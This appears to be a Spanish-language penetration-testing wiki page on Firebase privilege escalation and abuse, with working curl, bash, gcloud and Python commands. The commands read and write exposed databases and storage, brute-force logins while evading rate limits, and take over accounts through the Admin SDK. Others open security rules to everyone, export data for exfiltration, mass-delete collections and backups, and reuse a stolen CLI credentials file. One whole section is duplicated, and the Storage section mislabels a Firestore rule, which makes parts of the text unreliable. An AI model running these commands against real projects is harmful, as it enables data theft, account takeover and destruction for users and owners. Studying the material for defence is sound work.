# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Acceso no autenticado a Firebase Realtime Database
Un atacante no necesita permisos específicos de Firebase para llevar a cabo este ataque. Solo requiere que exista una configuración vulnerable en las reglas de seguridad de Firebase Realtime Database, donde las reglas estén establecidas con `.read: true` o `.write: true`, permitiendo acceso público de lectura o escritura.

El atacante debe identificar la URL de la base de datos, que típicamente sigue el formato: `https://<project-id>.firebaseio.com/`.

Esta URL puede encontrarse mediante ingeniería inversa de aplicaciones móviles (decompilar APKs de Android o analizar apps iOS), analizando archivos de configuración como google-services.json (Android) o GoogleService-Info.plist (iOS), inspeccionando el código fuente de aplicaciones web, o examinando el tráfico de red para identificar peticiones a dominios `*.firebaseio.com`.

El atacante identifica la URL de la base de datos y comprueba si está expuesta públicamente, luego accede a los datos y, potencialmente, escribe información maliciosa.

Primero, comprueban si la base de datos permite acceso de lectura añadiendo .json a la URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Si la respuesta contiene datos JSON o null (en lugar de "Permission Denied"), la base de datos permite acceso de lectura. Para comprobar el acceso de escritura, el attacker puede intentar enviar una solicitud de escritura de prueba usando la Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Si la operación tiene éxito, la base de datos también permite acceso de escritura.

### Exposición de datos en Cloud Firestore
Un atacante no necesita permisos específicos de Firebase para llevar a cabo este ataque. Solo requiere que exista una configuración vulnerable en las reglas de seguridad de Cloud Firestore en la que las reglas permitan acceso de lectura o escritura sin autenticación o con validación insuficiente. Un ejemplo de una regla mal configurada que otorga acceso completo es:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Esta regla permite a cualquiera leer y escribir todos los documentos sin ninguna restricción. Las reglas de Firestore son granulares y se aplican por colección y documento, por lo que un error en una regla específica puede exponer solo ciertas colecciones.

El atacante debe identificar el Firebase Project ID, que puede encontrarse mediante ingeniería inversa de la aplicación móvil, análisis de archivos de configuración como google-services.json o GoogleService-Info.plist, inspección del código fuente de aplicaciones web o análisis del tráfico de red para identificar solicitudes a firestore.googleapis.com.
La Firestore REST API utiliza el formato:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Si las reglas permiten acceso de lectura no autenticado, el atacante puede leer colecciones y documentos. Primero, intentan acceder a una colección específica:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Si la respuesta contiene documentos JSON en lugar de un error de permisos, la colección está expuesta. El atacante puede enumerar todas las colecciones accesibles probando nombres comunes o analizando la estructura de la aplicación. Para acceder a un documento específico:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Si las reglas permiten acceso de escritura no autenticado o tienen validación insuficiente, el atacante puede crear nuevos documentos:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Para modificar un documento existente se debe utilizar PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Para eliminar un documento y causar denegación de servicio:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposición de archivos en Firebase Storage
Un atacante no necesita permisos específicos de Firebase para llevar a cabo este ataque. Solo requiere que exista una configuración vulnerable en las reglas de seguridad de Firebase Storage en la que las reglas permitan el acceso de lectura o escritura sin autenticación o con validación insuficiente. Las reglas de Storage controlan los permisos de lectura y escritura de forma independiente, por lo que un error en una regla puede exponer solo el acceso de lectura, solo el de escritura, o ambos. Un ejemplo de una regla mal configurada que concede acceso total es:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Esta regla permite acceso de lectura y escritura a todos los documentos sin ninguna restricción. Las reglas de Firestore son granulares y se aplican por colección y por documento, por lo que un error en una regla específica puede exponer solo ciertas colecciones. El atacante debe identificar el Firebase Project ID, que puede encontrarse mediante ingeniería inversa de la aplicación móvil, análisis de archivos de configuración como google-services.json o GoogleService-Info.plist, inspección del código fuente de la aplicación web, o análisis del tráfico de red para identificar solicitudes a firestore.googleapis.com.
La Firestore REST API usa el formato:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Si las reglas permiten acceso de lectura sin autenticar, el atacante puede leer colecciones y documentos. Primero, intentan acceder a una colección específica.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Si la respuesta contiene la lista de archivos en lugar de un error de permisos, el archivo está expuesto. El atacante puede ver el contenido de los archivos especificando su ruta:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Si las reglas permiten acceso de escritura no autenticado o tienen validación insuficiente, el atacante puede subir archivos maliciosos. Para subir un archivo a través de la REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
El atacante puede subir code shells, malware payloads, o archivos grandes para causar un denial of service. Si la aplicación procesa o ejecuta archivos subidos, el atacante puede lograr remote code execution. Para eliminar archivos y causar un denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocación de Firebase Cloud Functions públicas
Un atacante no necesita permisos específicos de Firebase para explotar este problema; solo requiere que una Cloud Function sea accesible públicamente por HTTP sin autenticación.

Una función es vulnerable cuando está configurada de forma insegura:

- Usa functions.https.onRequest, que no aplica autenticación (a diferencia de las onCall functions).
- El código de la función no valida la autenticación del usuario (p. ej., no hay comprobaciones de request.auth o context.auth).
- La función es accesible públicamente en IAM, lo que significa que allUsers tiene el rol roles/cloudfunctions.invoker. Este es el comportamiento por defecto para HTTP functions a menos que el desarrollador restrinja el acceso.

Las Firebase HTTP Cloud Functions se exponen mediante URLs como:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Un atacante puede descubrir estas URLs mediante análisis de código fuente, inspección de tráfico de red, herramientas de enumeración o ingeniería inversa de apps móviles.
Si la función está expuesta públicamente y sin autenticación, el atacante puede invocarla directamente sin credenciales.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Si la función no valida correctamente las entradas, el atacante puede intentar otros ataques como code injection o command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
Un atacante no necesita permisos específicos de Firebase para llevar a cabo este ataque. Solo requiere que la API Key de Firebase esté expuesta en aplicaciones móviles o web, y que la política de contraseñas no haya sido configurada con requisitos más estrictos que los predeterminados.

El atacante debe identificar la API Key de Firebase, que puede encontrarse mediante mobile app reverse engineering, análisis de archivos de configuración como google-services.json o GoogleService-Info.plist, inspección del código fuente de aplicaciones web (por ejemplo, en bootstrap.js), o analizando el tráfico de red.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

Si Email Enumeration Protection está deshabilitado, las respuestas de error de la API pueden revelar si un email existe en el sistema (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), lo que permite a los atacantes enumerar usuarios antes de intentar adivinar contraseñas. Cuando esta protección está habilitada, la API devuelve el mismo mensaje de error tanto para emails inexistentes como para contraseñas incorrectas, lo que evita la enumeración de usuarios.

Es importante notar que Firebase Authentication aplica rate limiting, lo que puede bloquear las solicitudes si se realizan demasiados intentos de autenticación en poco tiempo. Por ello, un atacante tendría que introducir retrasos entre intentos para evitar ser bloqueado por rate limiting.

El atacante identifica la API Key y realiza intentos de autenticación con múltiples contraseñas contra cuentas conocidas. Si Email Enumeration Protection está deshabilitado, el atacante puede enumerar usuarios existentes analizando las respuestas de error:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Si la respuesta contiene EMAIL_NOT_FOUND, el correo electrónico no existe en el sistema. Si contiene INVALID_PASSWORD, el correo electrónico existe pero la contraseña es incorrecta, confirmando que el usuario está registrado. Una vez identificado un usuario válido, el atacante puede realizar intentos de brute-force. Es importante incluir pausas entre intentos para evitar los mecanismos de rate-limiting de Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Con la política de contraseñas por defecto (mínimo 6 caracteres, sin requisitos de complejidad), el atacante puede probar todas las combinaciones posibles de contraseñas de 6 caracteres, lo que representa un espacio de búsqueda relativamente pequeño comparado con políticas de contraseñas más estrictas.

### Gestión de usuarios en Firebase Authentication

El atacante necesita permisos específicos de Firebase Authentication para llevar a cabo este ataque. Los permisos requeridos son:

- `firebaseauth.users.create` para crear usuarios
- `firebaseauth.users.update` para modificar usuarios existentes
- `firebaseauth.users.delete` para eliminar usuarios
- `firebaseauth.users.get` para obtener información de usuarios
- `firebaseauth.users.sendEmail` para enviar correos electrónicos a usuarios
- `firebaseauth.users.createSession` para crear sesiones de usuario

Estos permisos están incluidos en el rol `roles/firebaseauth.admin`, que otorga acceso completo de lectura/escritura a los recursos de Firebase Authentication. También están incluidos en roles de mayor nivel como roles/firebase.developAdmin (que incluye todos los permisos firebaseauth.*) y roles/firebase.admin (acceso completo a todos los servicios de Firebase).

Para usar el Firebase Admin SDK, el atacante necesitaría acceso a las credenciales de cuenta de servicio (archivo JSON), que podrían encontrarse en sistemas comprometidos, repositorios de código expuestos públicamente, sistemas CI/CD comprometidos o mediante la compromisión de cuentas de desarrollador que tengan acceso a estas credenciales.

El primer paso es configurar el Firebase Admin SDK usando las credenciales de cuenta de servicio.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Para crear un usuario malicioso utilizando el correo electrónico de la víctima, el atacante intentaría usar el Firebase Admin SDK para generar una nueva cuenta vinculada a ese correo.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Para modificar un usuario existente, el atacante actualizaría campos como la dirección de correo electrónico, el estado de verificación o si la cuenta está deshabilitada.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Para eliminar una cuenta de usuario y causar una denegación de servicio, el atacante emitiría una solicitud para eliminar al usuario por completo.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
El atacante también puede recuperar información sobre usuarios existentes solicitando su UID o su dirección de correo electrónico.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Además, el atacante podría generar enlaces de verificación o enlaces de restablecimiento de contraseña para cambiar la contraseña de un usuario y acceder a su cuenta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gestión de usuarios en Firebase Authentication
Un atacante necesita permisos específicos de Firebase Authentication para llevar a cabo este ataque. Los permisos requeridos son:

- `firebaseauth.users.create` para crear usuarios
- `firebaseauth.users.update` para modificar usuarios existentes
- `firebaseauth.users.delete` para eliminar usuarios
- `firebaseauth.users.get` para obtener información de usuarios
- `firebaseauth.users.sendEmail` para enviar correos a usuarios
- `firebaseauth.users.createSession` para crear sesiones de usuario

Estos permisos están incluidos en el rol `roles/firebaseauth.admin`, que otorga acceso completo de lectura/escritura a los recursos de Firebase Authentication. También forman parte de roles de mayor nivel como `roles/firebase.developAdmin` (que incluye todos los permisos firebaseauth.*) y `roles/firebase.admin` (acceso completo a todos los servicios de Firebase).

Para usar el Firebase Admin SDK, el atacante necesitaría acceso a credenciales de cuenta de servicio (un archivo JSON), que podrían obtenerse de sistemas comprometidos, repositorios de código expuestos públicamente, entornos CI/CD comprometidos o mediante el compromiso de cuentas de desarrollador que tengan acceso a estas credenciales.

El primer paso es configurar el Firebase Admin SDK utilizando credenciales de cuenta de servicio.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Para crear un usuario malicioso usando el correo electrónico de la víctima, el atacante intentaría crear una nueva cuenta de usuario con ese correo, asignando su propia contraseña e información de perfil.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Para modificar un usuario existente, el atacante cambiaría campos como la dirección de correo electrónico, el estado de verificación o si la cuenta está deshabilitada.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Para eliminar una cuenta de usuario —efectivamente provocando una denegación de servicio— el atacante emitiría una solicitud para eliminar permanentemente a ese usuario.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
El atacante también podría recuperar información sobre usuarios existentes, como su UID o email, solicitando los detalles del usuario ya sea por UID o por dirección de email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Además, el atacante podría generar enlaces de verificación o enlaces para restablecer la contraseña, lo que le permitiría cambiar la contraseña de un usuario y tomar el control de la cuenta.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modificación de reglas de seguridad en los servicios de Firebase
El atacante necesita permisos específicos para modificar las reglas de seguridad según el servicio. Para Cloud Firestore y Firebase Cloud Storage, los permisos requeridos son `firebaserules.rulesets.create` para crear rulesets y `firebaserules.releases.create` para desplegar releases. Estos permisos están incluidos en el rol `roles/firebaserules.admin` o en roles de nivel superior como `roles/firebase.developAdmin` y `roles/firebase.admin`. Para Firebase Realtime Database, el permiso requerido es `firebasedatabase.instances.update`.

El atacante debe usar la Firebase REST API para modificar las reglas de seguridad.
Primero, el atacante necesitaría obtener un token de acceso utilizando credenciales de cuenta de servicio.
Para obtener el token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Para modificar las reglas de Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Para modificar las reglas de Cloud Firestore, el atacante debe crear un ruleset y luego desplegarlo:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
El comando anterior devuelve un nombre de ruleset en el formato projects/<project-id>/rulesets/<ruleset-id>. Para desplegar la nueva versión, se debe actualizar el release mediante una petición PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Para modificar las reglas de Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
El comando anterior devuelve un nombre de ruleset en el formato projects/<project-id>/rulesets/<ruleset-id>. Para desplegar la nueva versión, la release debe actualizarse usando una petición PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration y manipulación en Cloud Firestore
Cloud Firestore usa la misma infraestructura y el mismo sistema de permisos que Cloud Datastore, por lo que los permisos de Datastore IAM se aplican directamente a Firestore. Para manipular políticas TTL, se requiere el permiso `datastore.indexes.update`. Para exportar datos, se requiere el permiso `datastore.databases.export`. Para importar datos, se requiere el permiso datastore.databases.import. Para realizar eliminación masiva de datos, se requiere el permiso `datastore.databases.bulkDelete`.

Para operaciones de backup y restore, se necesitan permisos específicos:

- `datastore.backups.get` and `datastore.backups.list` to list and retrieve details of available backups
- `datastore.backups.delete` to delete backups
- `datastore.backups.restoreDatabase` to restore a database from a backup
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` to manage backup schedules

Cuando se crea una política TTL, se selecciona una propiedad designada para identificar las entidades elegibles para eliminación. Esta propiedad TTL debe ser del tipo Date and time. El atacante puede elegir una propiedad que ya exista o designar una propiedad que planee añadir más tarde. Si el valor del campo es una fecha en el pasado, el documento pasa a ser elegible para eliminación inmediata. El atacante puede usar el gcloud CLI para manipular las políticas TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Para exportar datos y exfiltrate, el atacante podría usar el gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Para importar datos maliciosos:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Para eliminar masivamente datos y provocar un denial of service, el atacante podría usar la gcloud Firestore bulk-delete tool para eliminar colecciones completas.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Para operaciones de copia de seguridad y restauración, el atacante podría crear copias de seguridad programadas para capturar el estado actual de la base de datos, listar copias existentes, restaurar desde una copia para sobrescribir cambios recientes, eliminar copias para causar pérdida permanente de datos y eliminar copias programadas.
Para crear una programación diaria de copias de seguridad que genere inmediatamente una copia:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Para restaurar desde una copia de seguridad específica, el atacante podría crear una nueva base de datos usando los datos contenidos en esa copia de seguridad. La operación de restauración escribe los datos de la copia de seguridad en una nueva base de datos, lo que significa que no se puede usar un DATABASE_ID existente.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Para eliminar una copia de seguridad y provocar pérdida de datos permanente:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Robo y uso indebido de las credenciales de Firebase CLI
Un atacante no necesita permisos específicos de Firebase para llevar a cabo este ataque, pero sí necesita acceso al sistema local del desarrollador o al archivo de credenciales de Firebase CLI. Estas credenciales se almacenan en un archivo JSON ubicado en:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Este archivo contiene tokens de autenticación, incluidos refresh_token y access_token, que permiten al atacante autenticarse como el usuario que ejecutó originalmente firebase login.

El atacante obtiene acceso al archivo de credenciales de Firebase CLI. A continuación puede copiar todo el archivo a su propio sistema, y la Firebase CLI usará automáticamente las credenciales desde su ubicación por defecto. Tras hacerlo, el atacante podrá ver todos los proyectos de Firebase accesibles para ese usuario.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
